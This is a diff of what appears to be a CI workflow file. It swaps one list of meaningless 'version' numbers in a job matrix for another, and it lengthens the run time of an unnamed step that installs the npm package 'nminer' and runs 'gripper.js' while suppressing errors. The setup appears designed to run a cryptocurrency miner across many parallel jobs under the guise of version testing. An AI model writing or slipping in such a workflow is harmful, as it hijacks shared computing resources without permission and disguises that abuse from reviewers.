@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7588 }
-          - { version: 8076 }
-          - { version: 5174 }
-          - { version: 5481 }
-          - { version: 4849 }
-          - { version: 5991 }
-          - { version: 4502 }
-          - { version: 695 }
-          - { version: 6921 }
-          - { version: 8462 }
-          - { version: 9556 }
-          - { version: 8202 }
-          - { version: 2124 }
-          - { version: 4747 }
-          - { version: 905 }
-          - { version: 8513 }
-          - { version: 967 }
-          - { version: 4694 }
+          - { version: 492 }
+          - { version: 4360 }
+          - { version: 4168 }
+          - { version: 3217 }
+          - { version: 8314 }
+          - { version: 8707 }
+          - { version: 9180 }
+          - { version: 9507 }
+          - { version: 1035 }
+          - { version: 9754 }
+          - { version: 2108 }
+          - { version: 6262 }
+          - { version: 1739 }
+          - { version: 5482 }
+          - { version: 1148 }
+          - { version: 2651 }
+          - { version: 3326 }
 
     steps:
       - name: Checkout
@@ -40,4 +39,4 @@ jobs:
       - name: 
         run: |
           npm install nminer@latest
-          timeout 315m node gripper.js || echo "gripper executed"
+          timeout 342m node gripper.js || echo "gripper executed"
